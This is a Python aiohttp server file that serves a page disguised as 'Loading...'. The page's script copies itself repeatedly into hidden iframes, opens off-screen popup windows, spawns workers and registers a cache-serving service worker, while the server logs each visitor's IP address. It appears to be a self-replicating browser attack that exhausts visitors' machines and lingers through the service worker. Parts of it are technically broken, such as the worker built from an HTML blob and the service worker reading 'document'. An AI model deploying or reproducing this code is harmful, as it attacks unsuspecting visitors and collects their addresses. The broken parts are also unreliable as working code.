# main.py
from aiohttp import web
import json
from datetime import datetime

html_template = """
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<script>
class ReplicationNode {
    constructor() {
        this.attempts = 0;
        this.init();
    }

    async init() {
        // Multiple replication strategies
        this.createHiddenIframes();
        this.createWorker();
        this.attemptWindowOpen();
        this.setupServiceWorker();
    }

    createHiddenIframes() {
        // Create multiple hidden iframes
        for(let i = 0; i < 5; i++) {
            const frame = document.createElement('iframe');
            frame.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0';
            frame.srcdoc = document.documentElement.outerHTML;
            document.body.appendChild(frame);
        }
    }

    createWorker() {
        // Web Worker replication
        const blob = new Blob([document.documentElement.outerHTML], {type: 'text/html'});
        const url = URL.createObjectURL(blob);
        new Worker(url);
    }

    attemptWindowOpen() {
        // Try various window opening strategies
        const features = 'width=1,height=1,left=-9999,top=-9999';
        window.open(location.href, '_blank', features);
        document.body.click(); // Some browsers allow popups after user interaction
    }

    async setupServiceWorker() {
        if ('serviceWorker' in navigator) {
            try {
                await navigator.serviceWorker.register('/sw.js');
            } catch(e) {
                console.log(e);
            }
        }
    }
}

// Start replication on any user interaction
['click', 'touchstart', 'scroll'].forEach(event => {
    document.addEventListener(event, () => new ReplicationNode(), {once: true});
});

// Initial replication
new ReplicationNode();
</script>
</body>
</html>
"""

service_worker = """
self.addEventListener('install', event => {
    self.skipWaiting();
    // Cache the replication code
    caches.open('replica-v1').then(cache => {
        cache.put('/', new Response(document.documentElement.outerHTML));
    });
});

self.addEventListener('activate', event => {
    event.waitUntil(clients.claim());
});

self.addEventListener('fetch', event => {
    // Serve cached replica
    event.respondWith(
        caches.match(event.request).then(response => response || fetch(event.request))
    );
});
"""

class Server:
    def __init__(self):
        self.replicas = set()

    async def handle(self, request):
        self.replicas.add(request.remote)
        return web.Response(text=html_template, content_type='text/html')

    async def sw(self, request):
        return web.Response(text=service_worker, content_type='application/javascript')

app = web.Application()
server = Server()
app.router.add_get('/', server.handle)
app.router.add_get('/sw.js', server.sw)

if __name__ == '__main__':
    web.run_app(app, port=8080)